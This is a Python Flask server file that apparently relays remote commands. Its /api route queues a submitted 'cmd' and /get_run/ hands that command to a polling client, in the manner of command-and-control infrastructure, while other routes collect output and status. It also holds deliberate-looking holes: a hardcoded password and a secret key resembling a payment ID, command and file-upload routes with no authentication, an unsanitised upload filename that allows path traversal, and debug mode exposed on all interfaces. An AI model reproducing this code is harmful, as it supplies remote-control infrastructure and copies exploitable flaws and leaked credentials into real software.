from flask import Flask, request, render_template,session,redirect
import os
password = "kanha0003"

app = Flask(__name__)

app.secret_key = '8279692610@paytm'  # Replace with your secret key

  
  
@app.route('/login/', methods=['POST','GET'])
def login():
    if request.method == 'POST':
        # username = request.form['username']
        password = request.form['password']
        if password == 'kanha0003':
            session['key'] = 'kanha0003'
            return redirect('/')
        else:
            return render_template('in_login.html')
    if session.get('key') == 'kanha0003':
        return redirect('/')
    else:
        return render_template('login.html')

    

@app.route('/chat/')
def chat():
    return render_template('chat.html') 
@app.route('/anim/')
def anim():
    return render_template('anim.htm') 


  
@app.route('/')
def home():
    if session.get('key') == 'kanha0003':
        return render_template('home.html')
    else:
        return redirect('/login')



@app.route('/api', methods=['POST'])
def api():
    cmd = request.form['cmd']
    fo=open('static/txt/run.txt' , 'w+')
    fo.write(cmd)
    fo.close()
    return 'Msg Sucessfully send... Wait For response..'




@app.route('/not/')
def nt():
    fo=open('static/txt/get.txt' , 'w+')
    fo.write('')
    fo.close()
    return 'sucess'


@app.route('/write/', methods=['GET'])
def write():
    data = request.args.get('run')
    fo = open('static/txt/get.txt', 'w')
    fo.write(data)
    fo.close()
    return 'success'

@app.route('/opt/', methods=['GET'])
def opt():
    data = request.args.get('opt')
    fo = open('static/txt/opt.txt', 'w')
    fo.write(data)
    fo.close()
    return 'success'

@app.route('/reset/', methods=['GET'])
def reset():
    data = request.args.get('reset')
    fo = open('static/txt/run.txt', 'w+')
    fo.write('')
    fo.close()
    return 'success'

@app.route('/get_run/', methods=['GET'])
def run():
    data = request.args.get('run')
    fo = open('static/txt/run.txt', 'r')
    raw = fo.read()
    fo.close()
    fo = open('static/txt/run.txt', 'w+')
    fo.write('')
    fo.close()
    return raw


@app.route('/status/', methods=['GET'])
def status():
    data = request.args.get('status')
    fo = open('static/txt/status.txt', 'w+')
    fo.write(data)
    fo.close()
    return 'ok'

@app.route('/get_status/')
def status_get():
    fo1 = open('static/txt/status.txt', 'r')
    all = fo1.read()
    fo1.close()

    fo = open('static/txt/status.txt', 'w+')
    fo.write('Offline')
    fo.close()

    return all


@app.route('/file/', methods=['POST'])
def file():
    if 'file' not in request.files:
        return 'No file uploaded'
    file = request.files['file']
    filename = file.filename
    save_path = os.path.join(app.static_folder, filename)

    file.save(save_path)

    return 'File uploaded successfully'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000,debug=True)
